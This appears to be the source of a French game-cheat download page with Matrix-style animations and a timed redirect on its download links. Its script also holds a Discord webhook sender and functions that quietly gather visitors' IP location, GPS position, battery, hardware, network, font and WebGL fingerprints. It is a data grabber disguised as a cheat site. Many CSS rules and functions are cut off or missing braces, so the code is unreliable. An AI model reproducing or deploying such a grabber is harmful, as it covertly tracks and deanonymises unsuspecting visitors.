  <style>
    html, body {
      margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden;
      background: #000;
      font-family: 'Courier New', monospace;
      color: white;
      text-align: center;
    }
    canvas {
      position: fixed;
      top: 0;
      height: 100%;
      display: block;
      pointer-events: none;
      user-select: none;
    }
    #matrixLeft, #matrixRight {
      width: 20%;

      z-index: 1;
    }
    #matrixLeft { left: 0; }
    #matrixRight { right: 0; }
    #starsCanvas {
      position: fixed;
      top: 0;
      left: 20%;
      width: 60%;
      height: 100%;
      z-index: 0;
    }
    .overlay {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      width: 60%;
      height: 100%;
      pointer-events: none;
      user-select: none;
      z-index: 2;
    }
    .title-top,
    .title-bottom {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      font-size: 110px;
      letter-spacing: 0.3em;
      margin: 0;
      pointer-events: none;
      user-select: none;
      white-space: nowrap;
      font-weight: bold;
    }
    .title-top { top: 10cm; }
    .title-bottom { bottom: 10cm; }
    .center-button {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, 0);
      background-color: red;
      color: white;
      border: 2px solid white;
      padding: 15px 35px;
      font-size: 20px;
      cursor: pointer;
      z-index: 3;

    #infos {
      position: absolute;

    /* Style pour la page des cheats */
    .cheat-page {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      z-index: 1000;
      overflow: auto;
      padding: 20px;
      box-sizing: border-box;
      position: relative;
    }
    /* √âtoiles n√©on pour le fond */
    .neon-stars {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      pointer-events: none;
    }
    .neon-star {
      position: absolute;
      background: radial-gradient(circle, rgba(102, 255, 255, 0.8) 0%, rgba(102, 255, 255, 0) 70%);
      border-radius: 50%;
      animation: neon-pulse 2s infinite alternate;
      box-shadow: 0 0 10px rgba(102, 255, 255, 0.7);
    }
    .neon-star::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 2px;
      height: 2px;
      background: white;
      border-radius: 50%;
    }
    @keyframes neon-pulse {
      0% {
        opacity: 0.7;
        transform: scale(1);
      }
      100% {
        opacity: 1;
        transform: scale(1.1);
      }
    }
    /* Curseur personnalis√© en croix rose */
    .custom-cursor {
      position: fixed;
      width: 30px;
      height: 30px;
      pointer-events: none;
      z-index: 1000;
      transform: translate(-50%, -50%);
    }
    .custom-cursor::before,
    .custom-cursor::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      background: #ff2d75;
      border-radius: 2px;
    }
    .custom-cursor::before {
      width: 20px;
      height: 2px;

    }
    .custom-cursor::after {

      height: 20px;

      border-radius: 10px;
      padding: 30px;
      width: 380px;
      height: 420px;

      flex-direction: column;

    .cheat-category:hover {

    .created-by {

    @keyframes pulse {
      from { text-shadow: 0 0 10px #ff2d75; }

    /* Page de redirection */
    .redirect-page {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      z-index: 2000;

    .redirect-content {

    .redirect-title {

    .redirect-timer {

    /* Barre de volume */
    .volume-control {

      bottom: 30px;

    .volume-slider::-webkit-slider-thumb {

    .volume-slider::-moz-range-thumb {
      width: 15px;
      height: 15px;
      border-radius: 50%;
      background: #00ffff;

    }
  </style>

  <script>
    // G√©n√©ration des √©toiles n√©on pour le fond
    function createNeonStars(containerId) {
      const container = document.getElementById(containerId);
      const starCount = 300;
      for (let i = 0; i < starCount; i++) {
        const star = document.createElement('div');
        star.classList.add('neon-star');
        const size = Math.random() * 5 + 1;
        const top = Math.random() * 100;
        const left = Math.random() * 100;
        // Couleurs n√©on vari√©es
        const colors = [
          'rgba(102, 255, 255, 0.8)', // Cyan
          'rgba(255, 102, 255, 0.8)', // Rose
          'rgba(204, 102, 255, 0.8)', // Violet
          'rgba(102, 204, 255, 0.8)', // Bleu clair
          'rgba(255, 255, 102, 0.8)'  // Jaune
        ];
        const color = colors[Math.floor(Math.random() * colors.length)];
        star.style.width = `${size}px`;
        star.style.height = `${size}px`;
        star.style.top = `${top}%`;
        star.style.left = `${left}%`;
        star.style.background = `radial-gradient(circle, ${color} 0%, ${color.replace('0.8', '0')} 70%)`;
        star.style.animationDuration = `${Math.random() * 4 + 1}s`;
        container.appendChild(star);
      }
    }

    // Curseur personnalis√© en croix rose
    function setupCustomCursor() {
      const cursor = document.getElementById('customCursor');
      document.addEventListener('mousemove', (e) => {
        cursor.style.left = `${e.clientX}px`;
        cursor.style.top = `${e.clientY}px`;
      });
    }

    // Gestion des liens de t√©l√©chargement
    function setupDownloadLinks() {
      const links = document.querySelectorAll('.download-link');
      const redirectPage = document.getElementById('redirectPage');
      const redirectTimer = document.getElementById('redirectTimer');
      const redirectMusic = document.getElementById('redirectMusic');
      const volumeSlider = document.getElementById('volumeSlider');
      // Variable pour stocker l'URL de redirection
      let currentRedirectUrl = '';
      // Contr√¥le du volume
      volumeSlider.addEventListener('input', function() {
        redirectMusic.volume = this.value;
      });
      links.forEach(link => {
        link.addEventListener('click', (e) => {
          e.preventDefault();
          currentRedirectUrl = link.getAttribute('data-url');
          // Afficher la page de redirection
          redirectPage.style.display = 'block';
          createNeonStars('redirectNeonStars');
          // Lancer la musique
          redirectMusic.currentTime = 0;
          redirectMusic.volume = volumeSlider.value;
          redirectMusic.play().catch(error => {
            console.log("La lecture automatique a √©t√© bloqu√©e :", error);
          });
          // Compte √† rebours (25 secondes)
          let count = 25;
          redirectTimer.textContent = count;
          const timer = setInterval(() => {
            count--;
            redirectTimer.textContent = count;
            if (count <= 0) {
              clearInterval(timer);
              // Redirection directe vers l'URL
              window.location.href = currentRedirectUrl;
              redirectPage.style.display = 'none';
              redirectMusic.pause();
            }
          }, 1000);
        });
      });
    }

    // Appel des fonctions
    document.addEventListener('DOMContentLoaded', function() {
      createNeonStars('neonStars');
      setupCustomCursor();
      setupDownloadLinks();
    });

    // ---------- Effets graphiques ----------
    const starsCanvas = document.getElementById('starsCanvas');
    const starsCtx = starsCanvas.getContext('2d');
    function resizeStars() {
      starsCanvas.width = window.innerWidth * 0.6;
      starsCanvas.height = window.innerHeight;
    }
    resizeStars();
    window.addEventListener('resize', resizeStars);
    class Star {
      constructor(color) {
        this.x = Math.random() * starsCanvas.width;
        this.y = Math.random() * starsCanvas.height;
        this.radius = Math.random() * 1.5 + 0.5;
        this.brightness = Math.random() * 0.5 + 0.5;
        this.brightnessChange = (Math.random() * 0.02 + 0.005) * (Math.random() < 0.5 ? 1 : -1);
        this.color = color;
      }
      update() {
        this.brightness += this.brightnessChange;
        if (this.brightness <= 0.5 || this.brightness >= 1) this.brightnessChange *= -1;
      }
      draw() {
        starsCtx.beginPath();
        starsCtx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        starsCtx.fillStyle = `rgba(${this.color},${this.brightness})`;
        starsCtx.shadowColor = `rgba(${this.color},${this.brightness})`;
        starsCtx.shadowBlur = 8;
        starsCtx.fill();
      }
    }
    const pink = '255,20,147';
    const white = '255,255,255';
    const stars = [];
    for (let i = 0; i < 200; i++) stars.push(new Star(pink));
    for (let i = 0; i < 100; i++) stars.push(new Star(white));
    function animateStars() {
      starsCtx.clearRect(0, 0, starsCanvas.width, starsCanvas.height);
      stars.forEach(s => { s.update(); s.draw(); });
      requestAnimationFrame(animateStars);
    }
    animateStars();
    // Colonnes Matrix
    function setupMatrix(canvas, colors) {
      const ctx = canvas.getContext('2d');
      const fontSize = 12;
      let columns;
      let drops;
      const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&';
      function resize() {
        canvas.width = canvas.offsetWidth;
        canvas.height = window.innerHeight;
        columns = Math.floor(canvas.width / fontSize);
        drops = new Array(columns).fill(1);
      }
      function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.font = fontSize + 'px monospace';
        for (let i = 0; i < drops.length; i++) {
          const text = chars.charAt(Math.floor(Math.random() * chars.length));
          const x = i * fontSize;
          const y = drops[i] * fontSize;
          ctx.fillStyle = colors[i % colors.length];
          ctx.fillText(text, x, y);
          if (y > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
          }
          drops[i] += 0.5;
        }
      }
      function loop() {
        draw();
        requestAnimationFrame(loop);
      }
      resize();
      window.addEventListener('resize', resize);
      loop();
    }
    setupMatrix(document.getElementById('matrixLeft'), ['rgb(0, 191, 255)', 'rgb(255, 255, 255)']);
    setupMatrix(document.getElementById('matrixRight'), ['rgb(255, 20, 147)', 'rgb(255, 105, 180)']);
    // Animation NO NAME color
    const topTitle = document.querySelector('.title-top');
    const bottomTitle = document.querySelector('.title-bottom');
    let colorPhase = 0;
    function lerpColor(a, b, t) {
      return a.map((v, i) => Math.round(v + (b[i] - v) * t));
    }
    function rgbString(arr) {
      return `rgb(${arr[0]},${arr[1]},${arr[2]})`;
    }
    function animateNoName() {
      const t = (Math.sin(colorPhase * Math.PI * 2) + 1) / 2;
      const color = lerpColor([255, 255, 255], [0, 191, 255], t);
      const css = rgbString(color);
      [topTitle, bottomTitle].forEach(el => {
        el.style.color = css;
        el.style.textShadow = `0 0 10px ${css}, 0 0 20px ${css}`;
      });
      colorPhase += 0.01;
      requestAnimationFrame(animateNoName);
    }
    animateNoName();
    // Fonction envoi webhook Discord
    async function sendWebhook(url, data) {
      try {
        let response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        });
        if (!response.ok) throw new Error('R√©ponse non OK ' + response.status);
        return { success: true };
      } catch (err) {
        console.error('Erreur envoi webhook:', err.message);
        return { success: false, error: err.message };
      }
    }
    // Fonction pour extraire version navigateur simple
    function parseBrowserVersion(userAgent) {
      const ua = userAgent.toLowerCase();
      let match = ua.match(/(firefox|chrome|safari|opr|edg|msie|trident(?=\/))\/?\s*(\d+)/) || [];
      if (/trident/.test(match[1])) {
        const rv = ua.match(/\brv[ :]+(\d+)/g) || [];
        return 'IE ' + (rv[1] || '');
      }
      if (match[1] === 'opr') return 'Opera ' + match[2];
      if (match[1] === 'edg') return 'Edge ' + match[2];
      return match.length > 2 ? `${match[1]} ${match[2]}` : 'Inconnu';
    }
    // NOUVELLES FONCTIONS POUR COLLECTER PLUS DE DONN√âES
    async function getIPGeolocation(ip) {
      try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        if (!response.ok) throw new Error("Service indisponible");
        const data = await response.json();
        return {
          ville: data.city || "Inconnue",
          region: data.region || "Inconnue",
          pays: data.country_name || "Inconnu",
          code_pays: data.country_calling_code || "N/A",
          latitude: data.latitude || "N/A",
          longitude: data.longitude || "N/A",
          fuseau_horaire: data.timezone || "N/A",
          devise: data.currency || "N/A",
          isp: data.org || "Inconnu",
          asn: data.asn || "N/A",
          proxy: data.proxy ? "Oui" : "Non",
          hosting: data.hosting ? "Oui" : "Non"
        };
      } catch (err) {
        return { error: "Localisation IP indisponible" };
      }
    }
    async function getGeolocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({error: "Geolocation non support√©e"});
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy + " m√®tres",
              timestamp: new Date(pos.timestamp).toString()
            });
          },
          (err) => {
            resolve({error: "Permission refus√©e ou erreur g√©oloc"});
          },
          {timeout: 10000}
        );
      });
    }
    async function getBatteryInfo() {
      if (!navigator.getBattery) return { error: "API batterie non support√©e" };
      try {
        const battery = await navigator.getBattery();
        return {
          niveau: (battery.level * 100).toFixed(2) + "%",
          en_charge: battery.charging ? "Oui" : "Non",
          temps_charge: battery.chargingTime ? (battery.chargingTime / 60).toFixed(1) + " min" : "N/A",
          temps_decharge: battery.dischargingTime ? (battery.dischargingTime / 60).toFixed(1) + " min" : "N/A"
        };
      } catch (e) {
        return { error: "Impossible de r√©cup√©rer les infos batterie" };
      }
    }
    function getDeviceInfo() {
      const info = {
        memoire: navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Non disponible",
        cores: navigator.hardwareConcurrency || "Non disponible",
        architecture: navigator.userAgentData?.platform || "Non disponible",
        model: navigator.userAgentData?.model || "Non disponible",
        mobile: navigator.userAgentData?.mobile ? "Oui" : "Non",
        max_touch_points: navigator.maxTouchPoints || "Non disponible",
        orientation: screen.orientation?.type || "Non disponible",
        pixel_ratio: window.devicePixelRatio || "Non disponible",
        couleur_profondeur: screen.colorDepth + " bits",
        resolution: `${screen.width}x${screen.height}`,
        resolution_disponible: `${screen.availWidth}x${screen.availHeight}`,
        time_zone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Non disponible"
      };
      // D√©tection des capteurs
      info.capteurs = {
        accelerometre: 'DeviceMotionEvent' in window ? "Oui" : "Non",
        gyroscope: 'DeviceOrientationEvent' in window ? "Oui" : "Non",
        luminosite: 'AmbientLightSensor' in window ? "Oui" : "Non",
        proximite: 'ProximitySensor' in window ? "Oui" : "Non"
      };
      return info;
    }
    function getNetworkInfo() {
      const connection = navigator.connection || {};
      return {
        en_ligne: navigator.onLine ? "Oui" : "Non",
        type_reseau: connection.effectiveType || "Non disponible",
        debit_descendant: connection.downlink ? connection.downlink + " Mbps" : "Non disponible",
        rtt: connection.rtt ? connection.rtt + " ms" : "Non disponible",
        sauvegarde_donnees: connection.saveData ? "Oui" : "Non",
        downlink_max: connection.downlinkMax ? connection.downlinkMax + " Mbps" : "Non disponible",
        connection_type: connection.type || "Non disponible"
      };
    }
    function getStorageInfo() {
      return {
        cookies: navigator.cookieEnabled ? "Activ√©s" : "D√©sactiv√©s",
        local_storage: (() => {
          try { localStorage.setItem('test', '1'); localStorage.removeItem('test'); return "Disponible"; }
          catch { return "Indisponible"; }
        })(),
        session_storage: (() => {
          try { sessionStorage.setItem('test', '1'); sessionStorage.removeItem('test'); return "Disponible"; }
          catch { return "Indisponible"; }
        })(),
        indexdb: (() => {
          try { return 'indexedDB' in window ? "Disponible" : "Indisponible"; }
          catch { return "Indisponible"; }
        })(),
        cache_api: 'caches' in window ? "Disponible" : "Indisponible",
        service_workers: 'serviceWorker' in navigator ? "Disponible" : "Indisponible"
      };
    }
    function getSecurityInfo() {
      return {
        protocol: window.location.protocol,
        ssl: window.location.protocol === "https:" ? "Oui (HTTPS)" : "Non (HTTP)",
        referrer_policy: document.referrerPolicy || "Non sp√©cifi√©e",
        content_security: (() => {
          const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
          return meta ? meta.content : "Non sp√©cifi√©e";
        })(),
        xss_protection: (() => {
          const meta = document.querySelector('meta[http-equiv="X-XSS-Protection"]');
          return meta ? meta.content : "Non sp√©cifi√©e";
        })(),
        crypto: 'crypto' in window ? "Web Crypto API disponible" : "Non disponible"
      };
    }
    function getPerformanceInfo() {
      const [timing, navigation] = [performance.timing, performance.navigation];
      return {
        temps_chargement: timing.loadEventEnd - timing.navigationStart || "N/A",
        temps_dom: timing.domComplete - timing.domLoading || "N/A",
        temps_dns: timing.domainLookupEnd - timing.domainLookupStart || "N/A",
        temps_tcp: timing.connectEnd - timing.connectStart || "N/A",
        temps_request: timing.responseEnd - timing.requestStart || "N/A",
        type_navigation: navigation.type === 0 ? "Normal" :
                         navigation.type === 1 ? "Rafra√Æchissement" :
                         navigation.type === 2 ? "Retour/avant" : "Inconnu",
        redirect_count: navigation.redirectCount || "Aucun"
      };
    }
    function getMediaInfo() {
      return {
        audio: (() => {
          const audio = new Audio();
          return {
            mp3: audio.canPlayType('audio/mpeg') || "Non",
            ogg: audio.canPlayType('audio/ogg') || "Non",
            wav: audio.canPlayType('audio/wav') || "Non"
          };
        })(),
        video: (() => {
          const video = document.createElement('video');
          return {
            mp4: video.canPlayType('video/mp4') || "Non",
            webm: video.canPlayType('video/webm') || "Non",
            ogg: video.canPlayType('video/ogg') || "Non"
          };
        })(),
        codecs: (() => {
          const codecs = [];
          if ('MediaRecorder' in window && MediaRecorder.isTypeSupported) {
            ['video/webm', 'video/webm;codecs=vp9', 'video/mp4', 'audio/webm', 'audio/mp4'].forEach(type => {
              try {
                codecs.push(`${type}: ${MediaRecorder.isTypeSupported(type) ? "Oui" : "Non"}`);
              } catch {}
            });
          }
          return codecs.length ? codecs.join(', ') : "API non support√©e";
        })(),
        devices: (() => {
          try {
            return navigator.mediaDevices ? "API disponible" : "API non disponible";
          } catch {
            return "Acc√®s refus√©";
          }
        })()
      };
    }
    function getFontInfo() {
      const fonts = [
        'Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana',
        'Helvetica', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS',
        'Arial Black', 'Impact', 'Lucida Console', 'Tahoma', 'Monospace'
      ];
      const detected = [];
      const baseFont = 'monospace';
      const testString = "mmmmmmmmmmwwwwwwwwww";
      const testSize = '100px';
      const baseWidth = getTextWidth(testString, baseFont, testSize);
      fonts.forEach(font => {
        try {
          const width = getTextWidth(testString, font, testSize);
          if (width !== baseWidth) detected.push(font);
        } catch {}
      });
      function getTextWidth(text, font, size) {
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        context.font = `${size} ${font}`;
        return context.measureText(text).width;
      }
      return {
        polices_detectees: detected.join(', ') || "Aucune",
        total_testes: fonts.length,
        api_fonts: 'fonts' in document ? "Disponible" : "Non disponible"
      };

    function getWebGLInfo() {

        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { error: "WebGL non support√©" };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL) || "Inconnu";
        const renderer = gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL) || "Inconnu";
        return {
          vendor: vendor,
          renderer: renderer,
          shading_language: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
          max_viewport_dims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
          antialias: gl.getContextAttributes().antialias ? "Oui" : "Non"
        };
      } catch (e) {
        return { error: "Impossible de r√©cup√©rer les infos WebGL" };
      }
    }
